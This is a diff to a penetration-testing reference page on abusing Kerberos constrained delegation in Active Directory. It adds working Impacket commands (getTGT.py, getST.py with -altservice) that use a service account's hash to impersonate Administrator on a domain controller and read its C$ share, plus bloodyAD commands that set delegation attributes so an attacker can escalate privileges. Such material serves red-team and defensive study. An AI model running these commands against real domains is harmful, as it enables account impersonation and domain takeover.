@@ -13,7 +13,7 @@ Using this a Domain admin can **allow** a computer to **impersonate a user or co
 
 This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to any **service** over the indicated machines (possible **privesc**).
 
-Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** because the SPN (the service name requested) is not being checked (in the ticket this part is not encrypted/signed). Therefore, if you have access to **CIFS service** you can also have access to **HOST service** using `/altservice` flag in Rubeus for example.
+Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** because the SPN (the service name requested) is not being checked (in the ticket this part is not encrypted/signed). Therefore, if you have access to **CIFS service** you can also have access to **HOST service** using `/altservice` flag in Rubeus for example. The same SPN swapping weakness is abused by **Impacket getST -altservice** and other tooling.
 
 Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.
 
@@ -30,6 +30,47 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 # Generate TGT + TGS impersonating a user knowing the hash
 Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
 ```
+
+### Cross-domain constrained delegation notes (2025+)
+
+Since **Windows Server 2012/2012 R2** the KDC supports **constrained delegation across domains/forests** via S4U2Proxy extensions. Modern builds (Windows Server 2016–2025) keep this behaviour and add two PAC SIDs to signal protocol transition:
+
+- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) when the user authenticated normally.
+- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) when a service asserted the identity through protocol transition.
+
+Expect `SERVICE_ASSERTED_IDENTITY` inside the PAC when protocol transition is used across domains, confirming the S4U2Proxy step succeeded.
+
+### Impacket / Linux tooling (altservice & full S4U)
+
+Recent Impacket (0.11.x+) exposes the same S4U chain and SPN swapping as Rubeus:
+
+```bash
+# Get TGT for delegating service (hash/aes)
+getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d
+
+# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
+getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
+         -impersonate Administrator contoso.local/websvc$ \
+         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5
+
+# Inject resulting ccache
+export KRB5CCNAME=Administrator.ccache
+smbclient -k //dc.contoso.local/C$ -c 'dir'
+```
+
+If you prefer forging the user ST first (e.g., offline hash only), pair **ticketer.py** with **getST.py** for S4U2Proxy. See the open Impacket issue #1713 for current quirks (KRB_AP_ERR_MODIFIED when the forged ST doesn't match the SPN key).
+
+### Automating delegation setup from low-priv creds
+
+If you already hold **GenericAll/WriteDACL** over a computer or service account, you can push the required attributes remotely without RSAT using **bloodyAD** (2024+):
+
+```bash
+# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
+KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
+KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
+```
+
+This lets you build a constrained delegation path for privesc without DA privileges as soon as you can write those attributes.
 
 - Step 1: **Get TGT of the allowed service**
 
@@ -89,7 +130,8 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 
 [**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
 
+## References
+- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
+- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)
+
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
